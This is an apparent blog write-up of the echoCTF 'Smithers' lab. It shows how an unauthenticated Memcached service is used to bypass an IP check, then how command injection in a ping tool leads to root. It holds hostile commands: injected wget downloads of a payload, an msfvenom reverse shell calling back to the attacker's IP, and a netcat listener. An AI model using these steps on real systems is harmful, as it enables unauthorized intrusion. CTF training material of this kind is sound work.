<!doctype html><html lang=en><head><title>echoCTF Smithers Writeup: Vulenrable Memcached version to root via Command Injection :: Hacking Blog</title>
<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Crack Smithers on echoCTF with exploitation of memcached service and command injection techniques. Perfect for OSCP prep!"><meta name=keywords content="CTF,hacking,cybersecurity,notes,writeups"><meta name=robots content="noodp"><link rel=canonical href=https://hack.com.cy/writeups/echoctf/smithers/smithers/><link rel=stylesheet href=https://hack.com.cy/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css><link rel=stylesheet href=https://hack.com.cy/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css><link rel=stylesheet href=https://hack.com.cy/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css><link rel=stylesheet href=https://hack.com.cy/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css><link rel=stylesheet href=https://hack.com.cy/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=https://hack.com.cy/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css><link rel=stylesheet href=https://hack.com.cy/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css><link rel=stylesheet href=https://hack.com.cy/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css><link rel=stylesheet href=https://hack.com.cy/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css><link rel=stylesheet href=https://hack.com.cy/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css><link rel=stylesheet href=https://hack.com.cy/css/sidebar.min.d99f1331c4dc2becb305a3d135a35844adbf5c1f39330853456f7e7f5864cb45.css><link rel=stylesheet href=https://hack.com.cy/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css><link rel=stylesheet href=https://hack.com.cy/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css><link rel=stylesheet href=https://hack.com.cy/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel=stylesheet href=https://hack.com.cy/terminal.css><link rel=stylesheet href=https://hack.com.cy/style.css><link rel="shortcut icon" href=https://hack.com.cy/favicon.png><link rel=apple-touch-icon href=https://hack.com.cy/apple-touch-icon.png><meta name=twitter:card content="summary"><meta name=twitter:site content><meta name=twitter:creator content><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="echoCTF Smithers Writeup: Vulenrable Memcached version to root via Command Injection"><meta property="og:description" content="Crack Smithers on echoCTF with exploitation of memcached service and command injection techniques. Perfect for OSCP prep!"><meta property="og:url" content="https://hack.com.cy/writeups/echoctf/smithers/smithers/"><meta property="og:site_name" content="Hacking Blog"><meta property="og:image" content="https://hack.com.cy/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:section" content="CTF"><meta property="article:section" content="OSCP Prep"><meta property="article:section" content="echoCTF"><meta property="article:published_time" content="2025-06-28 00:00:00 +0000 UTC"><meta name=theme-color content="#0a0e14"><meta name=color-scheme content="dark"><link rel=preload href=/fonts/FiraCode-Latin.woff2 as=font type=font/woff2 crossorigin><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><script src=https://cdn.jsdelivr.net/npm/fuse.js@6.6.2/dist/fuse.min.js></script><script defer src=https://hack.com.cy/js/search.js></script></head><body><div class="container center"><header class=header><div class=header__inner><div class=header__logo><a href=/why/><div class=logo><img src=/logo.png alt="Hacking Vault" class=logo-image></div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/why/>Why</a></li><li><a href=/whoami/>Whoami</a></li><li><a href=/writeups/>Writeups</a></li><li><a href=/notes/>Notes</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/why/>Why</a></li><li><a href=/whoami/>Whoami</a></li><li><a href=/writeups/>Writeups</a></li><li><a href=/notes/>Notes</a></li><li><button class=search-button onclick=showSearch() aria-label=Search>Search</button></li></ul></nav></header><div class=content><nav class=breadcrumbs aria-label=Breadcrumb><ol class=breadcrumb-list><li class=breadcrumb-item><a href=https://hack.com.cy/ class=breadcrumb-link><span class=breadcrumb-icon>~</span>Home</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/ class=breadcrumb-link>echoCTF Writeups</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/echoctf/ class=breadcrumb-link>echoCTF Writeups</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/echoctf/smithers/ class=breadcrumb-link></a></li><li class=breadcrumb-separator>/</li><li class="breadcrumb-item breadcrumb-current" aria-current=page><span class=breadcrumb-text>echoCTF Smithers Writeup: Vulenrable Memcached version to root via Command Injection</span></li></ol></nav><style>.breadcrumbs{margin:20px 0 30px;padding:10px 15px;background:var(--background-secondary);border-left:3px solid var(--accent);border-right:1px solid var(--code-border);border-top:1px solid var(--code-border);border-bottom:1px solid var(--code-border)}.breadcrumb-list{display:flex;flex-wrap:wrap;align-items:center;list-style:none;margin:0;padding:0;gap:8px;font-size:.9rem}.breadcrumb-item{display:inline-flex;align-items:center}.breadcrumb-link{color:var(--accent-secondary);text-decoration:none;transition:all .2s ease;display:inline-flex;align-items:center;gap:5px}.breadcrumb-link:hover{color:var(--accent);text-shadow:0 0 5px var(--glow-accent)}.breadcrumb-icon{color:var(--accent);font-weight:700}.breadcrumb-separator{color:var(--code-border);user-select:none}.breadcrumb-current .breadcrumb-text{color:var(--foreground);font-weight:700}@media(max-width:684px){.breadcrumbs{font-size:.85rem;overflow-x:auto}.breadcrumb-list{flex-wrap:nowrap}}</style><article class=post><h1 class=post-title><a href=https://hack.com.cy/writeups/echoctf/smithers/smithers/>echoCTF Smithers Writeup: Vulenrable Memcached version to root via Command Injection</a></h1><div class=post-meta><time class=post-date>2025-06-28&nbsp;[Updated 2026-01-01]</time><span class=post-reading-time>3 min read (632 words)</span></div><span class=post-tags>#<a href=https://hack.com.cy/tags/memcached/>Memcached</a>&nbsp;
#<a href=https://hack.com.cy/tags/command-injection/>Command Injection</a>&nbsp;
#<a href=https://hack.com.cy/tags/authentication-bypass/>Authentication Bypass</a>&nbsp;
#<a href=https://hack.com.cy/tags/privilege-escalation/>privilege escalation</a>&nbsp;</span><div class=table-of-contents><h2>Contents</h2><nav id=TableOfContents><ul><li><a href=#video-walkthrough>Video Walkthrough</a></li></ul><ul><li><a href=#nmap-port-scan>NMAP Port Scan</a></li><li><a href=#output>Output</a></li></ul></nav></div><div class=post-content><div><h2 id=video-walkthrough>Video Walkthrough<a href=#video-walkthrough class=hanchor arialabel=Anchor>#</a></h2><div style=position:relative;padding-bottom:56.25%;height:0;overflow:hidden><iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen loading=eager referrerpolicy=strict-origin-when-cross-origin src="https://www.youtube.com/embed/8ZxR4WGVqEQ?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style=position:absolute;top:0;left:0;width:100%;height:100%;border:0 title="YouTube video"></iframe></div><p><a href="https://www.youtube.com/watch?v=8ZxR4WGVqEQ"><img src="https://img.shields.io/badge/Watch%20on-YouTube-red?logo=youtube" alt="Watch on YouTube"></a></p><h1 id=smithers>Smithers<a href=#smithers class=hanchor arialabel=Anchor>#</a></h1><h1 id=enumeration>Enumeration<a href=#enumeration class=hanchor arialabel=Anchor>#</a></h1><h2 id=nmap-port-scan>NMAP Port Scan<a href=#nmap-port-scan class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap -vv -p- 10.0.50.0 -T4 -sC -sV -oA nmap/allports
</span></span></code></pre></div><h2 id=output>Output<a href=#output class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PORT      STATE SERVICE   REASON         VERSION
</span></span><span class=line><span class=cl>10888/tcp open  http      syn-ack ttl <span class=m>63</span> nginx
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Network Tools
</span></span><span class=line><span class=cl>11211/tcp open  memcached syn-ack ttl <span class=m>63</span> Memcached 1.5.12 <span class=o>(</span>uptime <span class=m>625</span> seconds<span class=o>)</span>
</span></span></code></pre></div><p>Analyzing the NMAP output we can see that we found ports 10888 and 11211 open.
Port 10888 seems that runs an <code>NGINX</code> web server.
Port 11211 its more interesting as the NMAP scan identifies that there is service running called <code>Memcached</code> and we can see the version of it as well <code>1.5.12</code></p><p>Lets start by visiting the webserver and see what we have..</p><p><img src=/images/Pasted%20image%2020250809170654.png alt="Image Description"></p><p>Through this error we can get a lot of information</p><ul><li>The Memcached service is related to the webserver as the server&rsquo;s version is the same with the Memcached version identified from NMAP.</li><li>The webserver has some sort of ACL or defensive mechanism related to IP addresses in this case its my kali IP is reflected back.</li><li>There is a variable which we do not know what it does yet called &ldquo;REMOTE_ADDR&rdquo;.</li></ul><p>Lets brute force the webserver in order to find any hidden directories or files..</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir -u http://10.0.50.0:10888/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o rsw.txt
</span></span></code></pre></div><p>Lets move to the next port where we do have a version as well..</p><p>What i usually do when i search for vulnerabilities for a specific software or service, is that i append the keywords “poc” “exploit” “github” prepending the version number and service name</p><p><img src=/images/Pasted%20image%2020250809170352.png alt="Image Description"></p><p>Even though we did not get any ready-made script using this search, we got an article on how we could test the Memcached server.</p><p><code>https://www.hackingarticles.in/penetration-testing-on-memcached-server/</code></p><p>Reading through this it seems that we can interact with the Memcached server just by using telenet likewise:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>telnet 10.0.50.0 <span class=m>11211</span>
</span></span></code></pre></div><p><img src=/images/Pasted%20image%2020250809171513.png alt="Image Description"></p><p>Go through the full article and it seems that we can execute various commands on the Memcached server like upload files, dump info etc. Most importantly it is noticed that we can set variables.</p><p>Equipped with that information we can try adding our IP within the REMOTE_ADDR variable displayed on the error page found earlier when we tried to visit the webserver.</p><p>I was able to do this using the following manual:</p><p><a href=https://www.tutorialspoint.com/memcached/memcached_quick_guide.htm>https://www.tutorialspoint.com/memcached/memcached_quick_guide.htm</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>telnet 10.0.50.0 <span class=m>11211</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>set</span> REMOTE_ADDR <span class=m>0</span> <span class=m>1100</span> <span class=m>12</span>
</span></span><span class=line><span class=cl>10.10.11.150
</span></span></code></pre></div><p>Make sure to replace <code>12</code> according to your IP length as the manual suggests (i.e., 10.10.11.14 will be <code>11</code>)</p><p>Now if we visit the webserver again we are being authorized!</p><p><img src=/images/Pasted%20image%2020250809172833.png alt="Image Description"></p><p>When i saw this i immediate replaced the IP with my kali IP in order to see if i can ping my self. This way we can make sure that the server can reach our kali IP.</p><p>Using tcp dump we can listen on icmp traffic if the ping is indeed successful:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo tcpdump -i tun0 icmp
</span></span></code></pre></div><p><img src=/images/Pasted%20image%2020250809173209.png alt="Image Description"></p><p>As expected we get the pings back, however how do we move forward from here.
Well the webserver obviously uses system commands &ldquo;ping&rdquo; and we control what comes after the <code>ping &lt;our input></code></p><p>What if we try to append a command? using &ldquo;;&rdquo;</p><p><img src=/images/Pasted%20image%2020250809173614.png alt="Image Description"></p><p>So know we can execute any command we want on the webserver by pre-pending &ldquo;;&rdquo;.</p><p>Lets get a shell..</p><p>First lets check the architecture of the target server so we know what architecture should our reverse shell be. We can do that by using <code>uname -a</code></p><p><img src=/images/Pasted%20image%2020250809173922.png alt="Image Description"></p><p>So lets create an x64 linux reverse shell using <code>msfvenom</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo msfvenom -p linux/x64/shell_reverse_tcp <span class=nv>LHOST</span><span class=o>=</span>10.10.11.150 <span class=nv>LPORT</span><span class=o>=</span><span class=m>80</span> -f elf -o rev
</span></span></code></pre></div><p>Now lets download and make the reverse shell executable on the target machine using <code>wget</code> and <code>chmod</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Serve a pyhton webserver</span>
</span></span><span class=line><span class=cl>python3 -m htt.server <span class=m>443</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Donload the file on the target</span>
</span></span><span class=line><span class=cl>10.10.11.150<span class=p>;</span>wget http://10.10.11.150/rev -O /tmp/rev
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Make it executrable</span>
</span></span><span class=line><span class=cl>10.10.11.150<span class=p>;</span>chmod +x /tmp/rev
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Listen on 80 to catch the shell</span>
</span></span><span class=line><span class=cl>sudo nc -nvlp <span class=m>80</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Execute the rev shell</span>
</span></span><span class=line><span class=cl>10.10.11.150<span class=p>;</span>/tmp/rev
</span></span></code></pre></div><p><img src=/images/Pasted%20image%2020250809180019.png alt="Image Description"></p><p>ROOT!</p></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2026 Powered by <a href=https://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script><div id=search-overlay><div class=search-container><input type=search id=search-input placeholder="Search writeups, notes, and more..." autocomplete=off aria-label=Search><div class=search-hint>Press <kbd>ESC</kbd> to close or <kbd>/</kbd> to open search</div><div id=search-results></div></div><button class=search-close onclick=hideSearch() aria-label="Close search">×</button></div></div></body></html>